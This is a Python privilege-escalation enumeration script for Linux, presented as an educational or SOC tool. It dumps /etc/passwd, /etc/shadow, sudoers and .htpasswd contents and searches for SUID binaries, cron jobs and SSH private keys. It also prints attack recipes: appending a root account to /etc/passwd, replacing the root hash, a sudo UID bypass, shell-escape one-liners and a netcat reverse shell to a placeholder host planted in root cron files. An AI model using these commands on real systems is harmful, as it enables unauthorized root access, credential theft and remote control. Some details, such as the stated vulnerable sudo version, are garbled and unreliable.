#!/usr/bin/env pyhton
# -*- coding: utf-8 -*-


import os
import time
import subprocess
from time import sleep
from threading import Timer
from os import system, popen
from datetime import datetime

#------------------> Clear Screen:
print("\n\nClearing Terminal")
time.sleep(0.5)
subprocess.call('clear', shell=True)
print("\n\nLoading Script...")
time.sleep(1)
subprocess.call('clear', shell=True)

#------------------> Banner:
print("\n")
print("\n")
print("\t\t\t╔════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t\t\t║██████╗ ██████╗ █████╗       ██╗███████╗ █████╗ ████████╗      ██╗  ██╗██╗   ██╗██╗     ██╗  ██╗║")
print("\t\t\t║██╔══██╗██╔══██╗██╔══██╗     ██║██╔════╝██╔══██╗╚══██╔══╝      ██║  ██║██║   ██║██║     ██║ ██╔╝║")
print("\t\t\t║██████╔╝██████╔╝██║  ██║     ██║█████╗  ██║  ╚═╝   ██║         ███████║██║   ██║██║     █████═╝ ║")
print("\t\t\t║██╔═══╝ ██╔══██╗██║  ██║██╗  ██║██╔══╝  ██║  ██╗   ██║  █████  ██╔══██║██║   ██║██║     ██╔═██╗ ║")
print("\t\t\t║██║     ██║  ██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝   ██║         ██║  ██║╚██████╔╝███████╗██║ ╚██╗║")
print("\t\t\t║╚═╝     ╚═╝  ╚═╝ ╚════╝  ╚════╝ ╚══════╝ ╚════╝    ╚═╝         ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝║")
print("\t\t\t╚═══════════════════════════════════════════════════════════════════{\033[1;31;40mThe Incredable Script v1.5\033[0m}═╝")
time.sleep(0.2)

#------------------> Info:
print("\n")
print("\033[1;34;40mInfo:\033[0m")
time.sleep(0.1)
print("\tThis script has been designed to help security team (SOC) or to be used for educational purposes in finding system vulnerability")
print("\tthat may lead to privilege escatation & it should be used in safe environment. The author is not responsible for any misuse of it")
time.sleep(0.1)
#------------------> Auth:
print("\n")
print("\033[1;34;40mAuther:\033[0m")
time.sleep(0.1)
print("\t     Iron Hulk")
print("\tMan In A Black Tuxedu")
time.sleep(0.1)
#------------------> Accounts:
print("\n")
print("\033[1;34;40mContact:\033[0m")
time.sleep(0.1)
print("\tTweet Me: IronHulk_x69")
time.sleep(0.1)
#------------------> Message:
print("\n")
print("\033[1;34;40mMessage:\033[0m")
time.sleep(0.1)
print("\tAll the POC's have been listed based on the author's opinion, you may use anything you which")
print("\trememebr, SKY HAS NO LIMITS :)")
time.sleep(0.1)
#------------------> Recommendation:
print("\n")
print("\033[1;34;40mRecommendation:\033[0m")
time.sleep(0.1)
print("\tFor a better view of the report is it recomended to redirect the output to a file. python projectHULK | tee report.txt")
time.sleep(0.1)
#------------------> Start time"
print("\n")
print("\033[1;34;40mScan Started At:\033[0m")
time.sleep(0.1)
start = datetime.now().strftime('%H:%M:%S')
print("\t",start)
time.sleep(0.1)

#------------------> Enumeration:
print("\n\n\033[1;31;40m\t\t\tEnumeration on progress #................................................................................. 1%\033[0m\n\n")
time.sleep(5)

print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]------------------------------------------------------- [ Password File Permission ] -------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

print("\n\033[1;34;40m[+] Each field is separated by a colon, and represents a different attribute to the user\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║<Username>:<Password>:<UserID>:<GroupID>:<GecosField>:<HomeDirectory>:<Shell> ║")
print("\t  ║If an -x- is representing the password field, this indicates that the password║")
print("\t  ║is encrypted.                                                                 ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
time.sleep(1)

#------------------> Password File:
print("\n\033[1;34;40m[+] Password file\033[0m")
returned_text = subprocess.check_output("ls -la /etc/passwd", shell=True, universal_newlines=True)
if(returned_text[2]== 'w'and returned_text[5]=='w'and returned_text[8]=='w'):
    print("{}".format(returned_text))
    print("\033[0;37;41mFile is Exploitable\033[0m")
    print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
    print("\t  ║The file can be abused by copying the root detail &                           ║")
    print("\t  ║replacing the root name by other name with root hash details                  ║")
    print("\t  ║\033[1;31;40mPOC:\033[0m                                                          ║")
    print("\t  ║\033[1;31;40mFirst generate a password with one of the following commands:\033[0m ║")
    print("\t  ║\033[1;31;40m    openssl passwd -1 -salt hulk password\033[0m                     ║")
    print('\t  ║\033[1;31;40m    perl -le ''print crypt("hulk", "password")\033[0m                ║')
    print("\t  ║\033[1;31;40mOverwrite the password file:\033[0m                                  ║")
    print('\t  ║\033[1;31;40m    echo "hulk:HASH:0:0::/root:/bin/bash" >> /etc/passwd"\033[0m     ║')
    print("\t  ║\033[1;31;40mThen do: su hulk\033[0m                                              ║")
    print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
else:
    print("{}".format(returned_text))
    print("\033[0;37;42mPassword File Is Not Writable\033[0m")
print("\n\033[1;34;40m[+] Reading The Password File:\033[0m")
os.system ('cat /etc/passwd')

#------------------> Hash in Password File:
print("\n\033[1;34;40m[+] Hash in Password File\033[0m")
os.system ("grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null")

#------------------> Shadow File:
print("\n\033[1;34;40m[+] Shadow file\033[0m")
os.system ('ls -la /etc/shadow')
try:
       returned_text=subprocess.check_output("cat /etc/shadow",shell=True,stderr=subprocess.STDOUT)
except subprocess.CalledProcessError as e:
       returned_text=("{}  ".format(e.output))
if (returned_text.find("Permission denied") > -1 ):
    print("    {}".format(returned_text))
    print("\033[0;37;42mFile Is Protected\033[0m")
else:
    print("    {}".format(returned_text))
    print("\033[0;37;41mFile is Exploitable\033[0m")
    print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
    print("\t  ║The file can be abused by replacing the root HASH with the attacker's HASH    ║")
    print("\t  ║\033[1;31;40mPOC:\033[0m                                                                          ║")
    print("\t  ║\033[1;31;40m1) Generate a new Shadow Hash and replace it with the\033[0m                         ║")
    print("\t  ║\033[1;31;40m   current root hash:\033[0m                                                         ║")
    print("\t  ║\033[1;31;40m    - mkpasswd  -m sha-512 -S prove123 -s\033[0m                                     ║")
    print("\t  ║\033[1;31;40m2) Open the shadow file using any text edirot of your choice:\033[0m                 ║")
    print("\t  ║\033[1;31;40m   or copy your HASH from your system and replace it with\033[0m                     ║")
    print("\t  ║\033[1;31;40m   the root hash\033[0m                                                              ║")
    print("\t  ║\033[1;31;40m3) Login to root using your password\033[0m                                          ║")
    print("\t  ║\033[1;31;40m4) Or Simply do:\033[0m                                                              ║")
    print('\t  ║\033[1;31;40mecho "privesc:Npge08pfz4wuk:0:0:privesc,,,:/:/bin/bash" >> /etc/passwd\033[0m        ║')
    print("\t  ║\033[1;31;40mThis adds a root privilege user 'privesc' with the password 'password'\033[0m        ║")
    print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
    print("\n")
    print("\033[0;37;42mHow to protect the file\033[0m")
    print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
    print("\t  ║Limit the access to it and make sure it can be read or written only by root   ║")
    print("\t  ║\033[1;31;40mPOC:\033[0m                                                                          ║")
    print("\t  ║\033[1;31;40mDo: chmod 600 /etc/shadow\033[0m                                                     ║")
    print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")

#------------------> Sudoers File:
print("\n\033[1;34;40m[+] Sudoers file\033[0m")
os.system ('ls -la /etc/sudoers')
try:
       returned_text=subprocess.check_output("cat /etc/sudoers",shell=True,stderr=subprocess.STDOUT)
except subprocess.CalledProcessError as e:
       returned_text=("{}  ".format(e.output))
try:       
    if (returned_text.find("Permission denied") > -1 ):
        print("{}".format(returned_text))
        print("\033[0;37;42mFile Is Protected\033[0m")
    else:
        print("{}".format(returned_text))
        print("\033[0;37;41mFile is Exploitable\033[0m")
        print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
        print("\t  ║The file shows a fully detailed about what the curent user my run as root. If ║")
        print("\t  ║the running file orapplication has a globle vulnerability, the attacker may   ║")
        print("\t  ║ google it and abuse it foruser escalation                                    ║")
        print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
except:
    print(" Sudoers File skiped ")

#------------------> User Group Lists:
print("\n\033[1;34;40m[+] User Group list\033[0m")
os.system ('ls -la /etc/group')
os.system('cat /etc/group')

#------------------> Password Policy:
print("\n\033[1;34;40m[+] Password Policy:\033[0m")
os.system ('grep "^PASS_MAX_DAYS\║^PASS_MIN_DAYS\║^PASS_WARN_AGE\║^ENCRYPT_METHOD" /etc/login.defs')

#------------------> Superusers:
print("\n\033[1;34;40m[+] Superuser:\033[0m")
os.system ("awk -F: '($3 == '0') {print}' /etc/passwd")

#------------------> List users with console:
print("\n\033[1;34;40m[+] List users with console:\033[0m")
os.system ('cat /etc/passwd | grep "sh$"')

#------------------> Root Accounts:
print("\n\033[1;34;40m[+] Root Accounts:\033[0m")
os.system ("grep -v -E '^#' /etc/passwd 2>/dev/null| awk -F: '$3 == 0 { print $1}' 2>/dev/null")

#------------------> Sensitive files:
print("\n\033[1;34;40m[+] Sensitive files:\033[0m")
os.system ('ls -la /etc/passwd 2>/dev/null ; ls -la /etc/group 2>/dev/null ; ls -la /etc/profile 2>/dev/null; ls -la /etc/shadow 2>/dev/null ; ls -la /etc/master.passwd 2>/dev/null')

#------------------> htpasswd:
print("\n\033[1;34;40m[+] htpasswd:\033[0m")
os.system ('find / -name .htpasswd -print -exec cat {} \; 2>/dev/null')
 
#------------------> Root History File:
print("\n\033[1;34;40m[+] Root History File:\033[0m")
os.system ('ls -la /root/.*_history 2>/dev/null')

print("\n")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]---------------------------------------------------------- [ System Information ] ----------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

#------------------> User Group Lists:
print("\n\033[1;34;40m[+] User may run sudo on:\033[0m")
try:
	returned_text = subprocess.check_output("sudo -S -k- -l", shell=True, universal_newlines=True, timeout=300000)
	print(returned_text)
except:
	print("Try to run sudo -l with password\033[0m")

#------------------> Current user is:
print("\n\033[1;34;40m[+] Current user is:\033[0m")
os.system ('whoami')

#------------------> User ID:
print("\n\033[1;34;40m[+] User ID:\033[0m")
os.system ('id')

#------------------> Are we in a docker container:
print("\n\033[1;34;40m[+] Are we in a docker:\033[0m")
os.system ('grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null')
print("\n\033[0;37;41mEsc Doker\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║A good example of escaping docker is a machine on HackTheBox named READY:     ║")
print("\t  ║https://www.secjuice.com/htb-ready-walkthrough/                               ║")
print("\t  ║Read More:-                                                                   ║")
print("\t  ║https://gtfobins.github.io/gtfobins/docker/                                   ║")
print("\t  ║https://www.hackingarticles.in/docker-privilege-escalation/                   ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")

#------------------> Are we in a lxd/lxc container:
print("\n\033[1;34;40m[+] Are we in a lxd/lxc:\033[0m")
os.system ('grep -qa container=lxc /proc/1/environ 2>/dev/null')

#------------------> Are we in a lxd group:
print("\n\033[1;34;40m[+] Are we in a lxd group:\033[0m")
os.system ('id | grep -i lxd 2>/dev/null')

print("\033[0;37;41mNote\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║Some times, the user may be a part of vulnrable group such as: lxd/lxc, Docker║")
print("\t  ║Wheel, Shadow, Disk, Video. Every group worths Googling for exploit.          ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
#------------------> System Name:
print("\n\033[1;34;40m[+] System Name:\033[0m")
os.system ('uname -a')

#------------------> System Release:
print("\n\033[1;34;40m[+] System Release:\033[0m")
os.system ('lsb_release -a')

#------------------> Host Name:
print("\n\033[1;34;40m[+] Host name:\033[0m")
os.system ('hostname')

#------------------>s System Version:
print("\n\033[1;34;40m[+] System Version:\033[0m")
os.system ('cat /proc/version | uname -a 2>/dev/null')
print("\033[0;37;41mNote\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║The version is not listed in our database. However make sure to keep your     ║")
print("\t  ║system always up-to-date. Old version are always vulnerab. Visit the link     ║")
print("\t  ║bellow for more details:                                                      ║")
print("\t  ║https://github.com/SecWiki/linux-kernel-exploits                              ║")
print("\t  ║Or use:                                                                       ║")
print('\t  ║searchsploit "Linux Kernel"                                                   ║')
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
print("\n")
print("\033[0;37;41mList of vulnerable kernel versions:\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║3.9.6 3.9.0 3.9 3.8.9 3.8.8 3.8.7 3.8.6 3.8.5 3.8.4 3.8.3 3.8.2 3.8.1 3.8.0 3.8 3.7.6 3.7.0 3.7 3.6.0 3.6 ║")
print("\t  ║3.5.0 3.5 3.4.9 3.4.8 3.4.6 3.4.5 3.4.4 3.4.3 3.4.2 3.4.1 3.4.0 3.4 3.3 3.2 3.19.0 3.16.0 3.15 3.14 3.13.1║")
print("\t  ║3.13.0 3.13 3.12.0 3.12 3.11.0 3.11 3.10.6 3.10.0 3.10 3.1.0 3.0.6 3.0.5 3.0.4 3.0.3 3.0.2 3.0.1 3.0.0    ║")
print("\t  ║2.6.9 2.6.8 2.6.7 2.6.6 2.6.5 2.6.4 2.6.39 2.6.38 2.6.37 2.6.36 2.6.35 2.6.34 2.6.33 2.6.32 2.6.31 2.6.30 ║")
print("\t  ║2.6.3 2.6.29 2.6.28 2.6.27 2.6.26 2.6.25 2.6.24.1 2.6.24 2.6.23 2.6.22 2.6.21 2.6.20 2.6.2 2.6.19 2.6.18  ║")
print("\t  ║2.6.17 2.6.16 2.6.15 2.6.14 2.6.13 2.6.12 2.6.11 2.6.10 2.6.1 2.6.0 2.4.9 2.4.8 2.4.7 2.4.6 2.4.5 2.4.4   ║")
print("\t  ║2.4.37 2.4.36 2.4.35 2.4.34 2.4.33 2.4.32 2.4.31 2.4.30 2.4.29 2.4.28 2.4.27 2.4.26 2.4.25 2.4.24 2.4.23  ║")
print("\t  ║2.4.22 2.4.21 2.4.20 2.4.19 2.4.18 2.4.17 2.4.16 2.4.15 2.4.14 2.4.13 2.4.12 2.4.11 2.4.10 2.2.24         ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝")

#------------------> Sudo Version:
print("\n\033[1;34;40m[+] Sudo Version:\033[0m")
os.system ('sudo -V | grep "Sudo ver"')
print("\033[0;37;41mNote\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║The version is not listed in our database. However make sure to keep your     ║")
print("\t  ║system always up-to-date. Old version are vulnerab. Use google for more       ║")
print("\t  ║details or use:                                                               ║")
print('\t  ║searchsploit "sudo"                                                           ║')
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")

#------------------> is sudo version vulnerable:
print("\n\033[1;34;40m[+] Is sudo version vulnerable?\033[0m")
os.system ('sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"')
print("\033[0;37;41mNote\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║If the sudo version <= v1.28, it is exploitable                               ║")
print("\t  ║\033[1;31;40mPOC:\033[0m                                                                          ║")
print("\t  ║\033[1;31;40msudo -u#-1 /bin/bash\033[0m                                                          ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
 
#------------------> who is logged on:
print("\n\033[1;34;40m[+] Who's logged in:\033[0m")
os.system ('w')

#------------------> Who was Sudo:
print("\n\033[1;34;40m[+] Who was Sudo:\033[0m")
os.system ('find /home -name .sudo_as_admin_successful 2>/dev/null')

#------------------> Path Environment:
print("\n\033[1;34;40m[+] Path Environment:\033[0m")
os.system ('systemctl show-environment')
print("\033[0;37;41mNote\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║If you have write permissions on any folder inside the PATH variable you may  ║")
print("\t  ║be able to hijack some libraries or binaries. Read more:                      ║")
print("\t  ║https://github.com/SecWiki/linux-kernel-exploits                              ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")


#------------------> Enumeration:
print("\n\n\033[1;31;40m\t\t\tEnumeration on progress ###################............................................................... 20%\033[0m\n\n")
time.sleep(5)

print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]----------------------------------------------------------- [ System Date/Time ] -----------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

#------------------> System Up Time:
print("\n\033[1;34;40m[+] Up Time:\033[0m")
with open("/proc/uptime", "r") as f:
	uptime = f.read().split(" ")[0].strip()
uptime = int(float(uptime))
uptime_hours = uptime // 3600
uptime_minutes = (uptime % 3600) // 60
print("   " + str(uptime_hours) + ":" + str(uptime_minutes) + " hours")

#------------------> System Date:
print("\n\033[1;34;40m[+] System Date:\033[0m")
os.system ('date 2>/dev/null')

#------------------> CPU Information:
print("\n\033[1;34;40m[+] CPU Information:\033[0m")
os.system ('lscpu')

print("\n")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]------------------------------------------------------------- [ System SUID ] --------------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

#------------------> What is SUID/GUID:
print("\n\033[1;34;40m[+] What is SUID/GUID?\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║SUID (Set User ID) and SGIDs (Set Group ID) executables are those that execute║")
print("\t  ║with the permission of the owner (SUID) or group (SGID). You can identify SUID║")
print("\t  ║and SGIDs by a representative 's' in the execute permission field the file:   ║")
print("\t  ║-rwsr-sr-x can often be exploited to gain root privilege                      ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")

#------------------> Find capability:
print("\n\033[1;34;40m[+] Find capability files\033[0m")
returned_text = subprocess.check_output("getcap -r / 2>/dev/null", shell=True, universal_newlines=True)
flag= 0
test= returned_text.split(" ")
for word in test :
     if word == "cap_setuid+ep":
        print(word)
        flag= 1
if (flag==0):
    print("{}".format(returned_text))
else:
    print("{}".format(returned_text))
print("\033[0;37;41mNote\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║Capabitity files are diffrent from system to another system. Googling them my ║")
print("\t  ║revile  a way of how to exploit them.                                         ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")

#------------------> Built-in Binaries:
print("\n\033[1;34;40m[+] Built-in Binaries\033[0m")
Built_inlist =["/usr/lib/dbus-1.0/dbus-daemon-launch-helper","/usr/libexec/polkit-agent-helper-1","/usr/bin/vmware-user-suid-wrapper","/usr/lib/chromium/chrome-sandbox","/usr/bin/ntfs-3g","/usr/sbin/mount.nfs","/usr/sbin/mount.cifs","/usr/lib/xorg/Xorg.wrap","/usr/lib/openssh/ssh-keysign","/usr/bin/su","/usr/bin/chfn","/usr/bin/sudo","/usr/bin/chsh","/usr/sbin/pppd","/usr/bin/mount","/usr/sbin/exim4","/usr/bin/umount","/usr/bin/pkexec","/usr/bin/passwd","/usr/bin/newgrp","/usr/bin/gpasswd"]
for libe in Built_inlist:
    print("{}".format(libe))
returned_text
print("\033[0;37;41mNote\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║Most linux system have these Binaries and they are builtin no escalation is   ║")
print("\t  ║done by them unless file permission has been change.                          ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")

#------------------> Finding System SUID:
print("\n\033[1;34;40m[+] Finding System SUID\033[0m")
try:
    returned_text =subprocess.check_output("find / -perm -u=s 2>/dev/null",shell=True,stderr=subprocess.STDOUT) # add ║ xargs ls -l
except subprocess.CalledProcessError as e:
    returned_text="{}".format(e.output)
print(returned_text)
ttt =returned_text.split()
print("\n\033[1;34;40m[+] Not Buld-in SUID\033[0m")
result = list(set(ttt) - set(Built_inlist))
for line in result:
    print("{}".format(line))
    print("\n")
print("\033[0;37;41mNote\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║These are not bulit-in binnaries and worth to goolge them for any exploit that║")
print("\t  ║my lead to privilage escalation. Visite: https://gtfobins.github.io/          ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")

#------------------> Finding System GUID:
print("\n\033[1;34;40m[+] Finding System GUID\033[0m")
os.system ('find / -perm -g=s -type f 2>/dev/null | xargs ls -l')

#------------------> Execute as the owner:
print("\n\033[1;34;40m[+] Find Binaries that will execute as the owner\033[0m")
os.system ('find / -perm -u=s -type f 2>/dev/null | xargs ls -l')

#------------------> Execute as the group:
print("\n\033[1;34;40m[+] Find binaries that will execute as the group\033[0m")
os.system ('find / -perm -g=s -type f 2>/dev/null | xargs ls -l')

#------------------> Sticky-bit binaries:
print("\n\033[1;34;40m[+] Find sticky-bit binaries\033[0m")
os.system ('find / -perm -1000 -type d 2>/dev/null | xargs ls -l && find / -perm -4000 2>/dev/null | xargs ls -l')

#------------------> World writable scripts invoked as root:
print("\n\033[1;34;40m[+] World writable scripts invoked as root\033[0m")
print("Run this command manually: find / -writable -type f 2>/dev/null | xargs ls -l")
print("\033[0;37;41mNote\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║If you find a script that is owned by root but is writable by anyone you can  ║")
print("\t  ║add your own malicious code into it and it will escalate your privileges when ║")
print("\t  ║the script runs as root                                                       ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")

#------------------> World writeable directories:
print("\n\033[1;34;40m[+] World writeable directories\033[0m")
os.system ('find / -perm -2 -type d 2>/dev/null | xargs ls -l && find / -type d -perm -g+w -or -perm -o+w 2>/dev/null | xargs ls -l && find / -type d -perm -g+w 2>/dev/null | xargs ls -l && find / -type d -perm -o+w 2>/dev/null | xargs ls -l')

#------------------> Writeable config files:
print("\n\033[1;34;40m[+] Writeable config files\033[0m")
os.system ('find /etc/ -writable -type f 2>/dev/null | xargs ls -l')

#------------------> How Files Can Be Uploaded:
print("\n\033[1;34;40m[+] How Files Can Be Uploaded\033[0m")
os.system ('which wget')
os.system ('which nc')
os.system ('which netcat')
os.system ('which socat')
os.system ('which python')
os.system ('which python3')
os.system ('which ftp')
os.system ('which tftp')
os.system ('which ssh')

#------------------> Writeable config files:
print("\n")
print("\033[1;34;40mUnexpected commands allows you to read and/or write files or even execute command\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print('\t  ║sudo awk "BEGIN {system("/bin/sh")}"                                          ║')
print("\t  ║sudo find /etc -exec sh -i \;                                                 ║")
print("\t  ║sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh                          ║")
print("\t  ║sudo tar c a.tar -I ./runme.sh a                                              ║")
print("\t  ║ftp>!/bin/sh                                                                  ║")
print("\t  ║less>! <shell_comand>                                                         ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")

#------------------> Profiles files:
print("\n\033[1;34;40m[+] Profiles files\033[0m")
os.system ('ls -l /etc/profile /etc/profile.d/')
print("\033[0;37;41mNote\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║The file /etc/profile and the files under /etc/profile.d/ are scripts that are║")
print("\t  ║executed when a user run a new shell. Therefore, if you can write or modify   ║")
print("\t  ║any of the files, you can escalate privilege.                                 ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")

#------------------> Is the .bashrc file writeable?:
print("\n\033[1;34;40m[+] Is the .bashrc file writeable?\033[0m")
os.system ('ls -la /home/*/.bashrc; locate .bashrc | xargs ls -la; find / -name .bashrc -xdev 2>/dev/null | xargs ls -la')
print("\033[0;37;41mNote\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║If so, malicious commands can be written to it and will be executed when the  ║")
print("\t  ║user/root logs in.                                                            ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")

#------------------> Enumeration:
print("\n\n\033[1;31;40m\t\t\tEnumeration on progress #############################################..................................... 50%\033[0m\n\n")
time.sleep(5)

print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]------------------------------------------------------------ [ System Process ] ------------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

print("\n")
print("\033[0;37;41mNote\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║Take a look to what processes are being executed and check if any process has ║")
print("\t  ║more privileges that it should. You can also use a tool called psyp.          ║")
print("\t  ║https://github.com/DominicBreuker/pspy                                        ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")
#------------------> Running Proccess:
print("\n\033[1;34;40m[+] Running Proccess on the system\033[0m")
os.system ('ps aux')

#------------------> Running Proccess as root
print("Consider running the command by: ps aux | grep USERNAME")
print("\n\033[1;34;40m[+] Running Proccess as root\033[0m")
os.system ('ps aux | grep root')

#------------------> Process binaries and associated permissions
print("\n\033[1;34;40m[+] Process binaries and associated permissions\033[0m")
os.system ("ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null | awk '!x[$0]++' 2>/dev/null")


print("\n")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]------------------------------------------------------ [ System Path Scheduled Tasks ] -----------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

#------------------> Current User Crontab:
print("\n\033[1;34;40m[+] Current User Crontab\033[0m")
os.system ('crontab -l 2>/dev/null')

#------------------> Other User Crontab:
print("\n\033[1;34;40m[+] Other User Crontab\033[0m")
os.system ('cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null')

#------------------> Scheduled Jobs:
print("\n\033[1;34;40m[+] Scheduled Jobs\033[0m")
os.system ('cat /etc/crontab')

print("\n")
print("\033[0;37;41mIf the File is Writable\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║If the file is running by root, & it is writable by anyone the attacker my abuse it                       ║")
print("\t  ║by replacing the content of it.                                                                           ║")
print("\t  ║\033[1;31;40mPOC:\033[0m                                                                                                      ║")
print("\t  ║\033[1;31;40mecho '/bin/sh' > file\033[0m                                                                                     ║")
print("\t  ║\033[1;31;40mecho '/bin/bash' > file \033[0m                                                                                  ║")
print("\t  ║\033[1;31;40mecho 'm /tmp/f;mkfifo /tmp/f;cat /tmp/f║/bin/sh -i 2>&1║nc a.a.a.a 443 >/tmp/f' > file\033[0m                    ║")
print("\t  ║\033[1;31;40mecho 'cp /bin/bash /tmp/bash; chmod 777 /tmp/bash' > file\033[0m                                                 ║")
print("\t  ║\033[1;31;40mecho 'echo root::0:0:root:/root:/bin/bash > /etc/passwd' > file\033[0m                                           ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝")

#------------------> System Timer:
print("\n\033[1;34;40m[+] System Timer List\033[0m")
os.system ('systemctl list-timers --all')

print("\n")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]------------------------------------------------------ [ Communications & Networking ] -----------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

#------------------> Network Details:
print("\n\033[1;34;40m[+] Network Details:\033[0m")
os.system ('/sbin/ifconfig')
print("\t  ╔═══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║Are there any other networks connected on localhost? This might need tunnelling║")
print("\t  ╚═══════════════════════════════════════════════════════════════════════════════╝")

#------------------> Firewall Rulls:
print("\n\033[1;34;40m[+] Firewall Rulls:\033[0m")
os.system ('iptables -nvL')

#------------------> Open Ports:
print("\n\033[1;34;40m[+]  Open Ports:\033[0m")
os.system ('netstat -antp')
print("\033[0;37;41mNote\033[0m")
print("\t  ╔══════════════════════════════════════════════════════════════════════════════╗")
print("\t  ║Are there any open ports on localhost we did not see when we were doing nmap? ║")
print("\t  ║This might need tunnelling or connecting to it localy                         ║")
print("\t  ╚══════════════════════════════════════════════════════════════════════════════╝")

#------------------> Network Route:
print("\n\033[1;34;40m[+] Network Route:\033[0m")
os.system ('route')

#------------------> Hosts File:
print("\n\033[1;34;40m[+] Hosts File:\033[0m")
os.system ('cat /etc/hosts')

#------------------> Name Server:
print("\n\033[1;34;40m[+] Name Server:\033[0m")
os.system ('cat /etc/resolv.conf')

#------------------> Neighbours:
print("\n\033[1;34;40m[+] Neighbours:\033[0m")
os.system ('(route | ip n)')

#------------------> Enumeration:
print("\n\n\033[1;31;40m\t\t\tEnumeration on progress ################################################################.................. 80%\033[0m\n\n")
time.sleep(5)

print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
print("\033[1;31;40m [+]------------------------------------------------------------ [ Finding SSH Keys ] ----------------------------------------------------------[+]\033[0m")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
time.sleep(1)

#------------------> Authorized_keys:
print("\n\033[1;34;40m[+] Authorized_keys:\033[0m")
os.system ('find / -name authorized_keys 2> /dev/null')

#------------------> id_rsa:
print("\n\033[1;34;40m[+] id_rsa:\033[0m")
os.system ('find / -name id_rsa 2> /dev/null')

print("\n")
print("\033[1;31;40m [+]############################################################################################################################################[+]\033[0m")
